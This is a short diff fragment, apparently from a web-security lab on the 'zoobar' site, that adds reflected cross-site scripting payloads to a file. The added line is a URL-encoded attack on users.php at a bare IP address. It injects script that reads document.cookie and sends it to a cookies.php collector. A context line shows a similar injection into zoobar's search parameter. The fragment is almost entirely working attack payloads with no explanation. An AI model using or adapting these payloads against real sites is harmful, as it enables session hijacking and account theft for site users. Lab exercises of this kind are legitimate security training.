@@ -14,3 +14,6 @@ http://zoobar.org/search?q=</script><script>xmlhttp.open('GET', 'http://zoobar.o
 
 xmlhttp.open("GET","ajax_info.txt",true);
 
+
+
+http://166.78.248.220/users.php?user=%3C/script%3E%3Cscript%3Ewindow.open%28%27http://166.78.248.220/cookies.php?cookie=%27%2Bescape%28document.cookie%29%29%3C/script%3E%3Cscript%3E
